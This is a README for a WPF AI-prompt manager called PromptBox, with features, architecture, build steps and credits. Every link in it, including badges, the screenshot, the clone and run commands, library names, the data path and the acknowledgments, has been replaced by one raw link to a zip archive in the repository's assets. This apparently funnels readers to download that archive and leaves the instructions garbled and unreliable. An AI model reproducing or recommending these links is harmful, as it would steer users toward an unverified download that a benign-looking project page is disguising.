<p align="center">
  <img src="https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip" width="256" />
</p>

<p align="center">

  <!-- Release -->
  <a href="https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip">
    <img src="https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip" />
  </a>

  <!-- License -->
  <a href="https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip">
    <img src="https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip" />
  </a>

  <!-- Issues -->
  <a href="https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip">
    <img src="https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip" />
  </a>

</p>
  
# PromptBox — AI Prompt Manager on Your Desktop

A modern, feature-rich WPF desktop application for managing AI prompts. Create, edit, organize, search, and export prompts for ChatGPT, GitHub Copilot, Claude, and other AI models.

![PromptBox Screenshot](https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip)

## Features

### Core Functionality
- **Prompt Management**: Create, edit, delete, and view prompt entries
- **Rich Metadata**: Each prompt includes title, category, tags, content, and timestamps
- **Markdown Support**: Write prompts in Markdown with real-time preview
- **Advanced Search**: Instant search across titles, tags, categories, and content
- **Tag System**: Multi-tag support with visual tag display and filtering
- **Category Organization**: Organize prompts by categories
- **Prompt Library Browser**: Browse and import prompts from a curated library
- **Version History (Git-like)**: One-click restore to any previous version with visual diff

### AI-Powered Features
- **AI Prompt Builder**: Create and test prompts with multiple AI models (OpenAI, Anthropic, Google, Mistral, Groq)
- **Prompt Workflows**: Run complete multi-step prompt workflows with a single click
- **Visual Workflow Designer**: Drag-and-drop workflow editor with conditional branching, loops, and error handling
- **Batch Processing**: Execute multiple prompts against multiple AI models in a single batch
- **Prompt Testing & A/B Comparison**: Create test suites with evaluation criteria, run tests, and compare variations
- **Prompt Comparison Tool**: Compare 2-4 prompt variations side-by-side with automatic ranking
- **AI Smart Suggestions**: Get AI-powered prompt improvements and variations
- **Context Injection**: Automatically inject files, folders, clipboard content into prompts

### Import/Export
- Export individual prompts as Markdown (`.md`) or plain text (`.txt`)
- Import/Export all prompts as JSON for backup
- Import/Export Prompts with Version History
- Import/Export Workflows (user-created)
- Export batch results to CSV/JSON
- Export comparison reports to Markdown

### User Experience
- **Modern UI**: Built with Material Design for a clean, professional look
- **Theme Support**: Toggle between Light and Dark modes
- **Clipboard Integration**: One-click copy to clipboard
- **Local First**: All data stored locally using LiteDB
- **Fast Performance**: Optimized search and filtering
- **Secure API Key Storage**: Windows DPAPI encryption for API keys

## Architecture

Built using **MVVM (Model-View-ViewModel)** pattern with clean separation of concerns:

```
PromptBox/
├── Models/              # Data models (Prompt, Category, Tag, Workflow)
├── ViewModels/          # MVVM ViewModels with business logic
├── Views/               # XAML views and UI
├── Controls/            # Custom controls (WorkflowCanvas, WorkflowNode, etc.)
├── Services/            # Business services (Database, Theme, Export, Search, AI, Workflow)
├── Properties/          # Application settings
└── Data/                # LiteDB database storage (created at runtime)
```

## Technology Stack

- **.NET 8.0** - Modern .NET framework
- **WPF** - Windows Presentation Foundation
- **MaterialDesignThemes** - Material Design UI components
- **LiteDB** - Lightweight NoSQL database for local storage
- **https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip** - Markdown rendering
- **https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip** - MVVM helpers and commands
- **Dependency Injection** - https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip

## Installation

### Prerequisites
- Windows 10/11
- .NET 8.0 SDK or Runtime

### Build from Source

1. Clone the repository:
```bash
git clone https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip
cd PromptBox
```

2. Restore NuGet packages:
```bash
dotnet restore
```

3. Build the solution:
```bash
dotnet build
```

4. Run the application:
```bash
dotnet run --project https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip
```

### Release Build

```bash
dotnet publish -c Release -r win-x64 --self-contained
```

The compiled application will be in `PromptBox/bin/Release/net8.0-windows/win-x64/publish/`

## Usage

### Creating a Prompt
1. Click **"New Prompt"** in the left sidebar
2. Enter a title, category, and tags (comma-separated)
3. Write your prompt content in the left editor (Markdown supported)
4. Preview renders in real-time on the right
5. Click **"Save"** to store the prompt

### Searching and Filtering
- Use the search bar to find prompts by title, content, tags, or category
- Click on a category in the sidebar to filter by category
- Click on a tag to filter by that specific tag
- Clear filters by clicking the selected item again

### Exporting
- **Single Prompt**: Select a prompt and use "Export as MD" or "Export as TXT"
- **All Prompts**: Use "Export All (JSON)" in the sidebar for backup
- **Copy to Clipboard**: Quick copy button for immediate use

### Importing
- Click "Import (JSON)" in the sidebar
- Select a previously exported JSON file
- All prompts will be imported as new entries

## Data Storage

All data is stored locally in:
```
https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip
```

This LiteDB database file contains all your prompts, categories, and tags. You can back it up by copying this file.

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgments

- [MaterialDesignInXAML](https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip) - Beautiful Material Design components
- [LiteDB](https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip) - Lightweight NoSQL database
- [Markdig](https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip) - Markdown processor
- [https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip](https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip) - MVVM helpers

## Contact

Project Link: [https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip](https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip)
